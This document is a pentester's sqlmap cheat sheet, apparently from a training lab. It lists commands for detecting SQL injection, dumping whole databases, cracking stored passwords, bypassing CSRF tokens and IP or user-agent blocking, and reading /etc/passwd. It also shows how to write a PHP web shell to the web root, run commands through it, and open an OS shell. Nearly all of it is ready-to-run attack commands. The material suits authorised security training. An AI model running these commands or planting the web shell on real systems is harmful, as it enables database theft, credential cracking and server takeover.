## **Basic commands**
1. Basic usage: `python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'`
2. Go to DevTools > Copy as cURL > paste to terminal > change curl to sqlmap
3. Post request: `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'` uid and name will be tested for SQLi vulnerability.
4. Post request - focus on uid parametr `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`
5. Full HTTP Requests: 
    1. Copy > Copy Request Headers > paste into a req.txt file
    2. To run SQLMap with an HTTP request file, we use the -r flag: `sqlmap -r req.txt`
6. To specify an alternative HTTP method, other than GET and POST (e.g., PUT), we can utilize the option --method: `sqlmap -u www.target.com --data='id=1' --method PUT`
7. Use options `--batch --dump` to automatically dump all data.
8. Use crawl option to detemine how deep to find: `--crawl=2`
9. The -t option stores the whole traffic content to an output file: `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`
10. `-v` option, which raises the verbosity level of the console output
11. Utilize the `--proxy` option to redirect the whole traffic through a (MiTM) proxy (e.g., Burp)
12. The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
13. The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
14. Prefix and sufix: `--prefix= --sufix=`
15. Count numbers of columns and add to command: `--union-cols=10`
## **Database Enumeration**
1. Basic DB Data EnumerationP: `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`
2. Table Enumeration: `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`
3. After spotting the table name of interest, retrieval of its content can be done by using the --dump option and specifying the table name with -T users: `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb`
4. Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite
5. Table/Row Enumeration: `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`
6. To narrow down the rows based on their ordinal number(s) inside the table, we can specify the rows with the --start and --stop options (e.g., start from 2nd up to 3rd entry): `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3`
7. Conditional Enumeration: `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`
### **Full DB Enumeration**
Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option -T altogether (e.g. --dump -D testdb). By simply using the switch --dump without specifying a table with -T, all of the current database content will be retrieved. As for the --dump-all switch, all the content from all the databases will be retrieved.

In such cases, a user is also advised to include the switch --exclude-sysdbs (e.g. --dump-all --exclude-sysdbs), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.
## **Advanced Database Enumeration**
1. DB Schema Enumeration: `sqlmap -u "http://www.example.com/?id=1" --schema`
2. Searching for Data: `sqlmap -u "http://www.example.com/?id=1" --search -T user`
3. To search for all column names based on a specific keyword (e.g. pass): `sqlmap -u "http://www.example.com/?id=1" --search -C pass`
4. Password Enumeration and Cracking: `sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users`
5. DB Users Password Enumeration and Cracking: `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`
**TIP: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.**
## **Bypassing Web Application Protections**
1. Anti-CSRF Token Bypass: `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`
2. Unique Value Bypass: `sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI`
3. Calculated Parameter Bypass: `sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI`
4. IP Address Concealing: A proxy can be set with the option --proxy (e.g. --proxy="socks4://177.39.187.70:33283"), where we should add a working proxy.
5. User-agent Blacklisting Bypass: `--random-agent`
6. Tamper Scripts
## **OS Exploitation**
1. Checking for DBA Privileges: `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`
2. Reading Local Files: `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`
3. Writing Local Files
    1. `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
    2. `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`
    3. `curl http://www.example.com/shell.php?cmd=ls+-la`
4. OS Command Execution:
    1. `sqlmap -u "http://www.example.com/?id=1" --os-shell`
    2. Error-based SQL Injection: `sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E`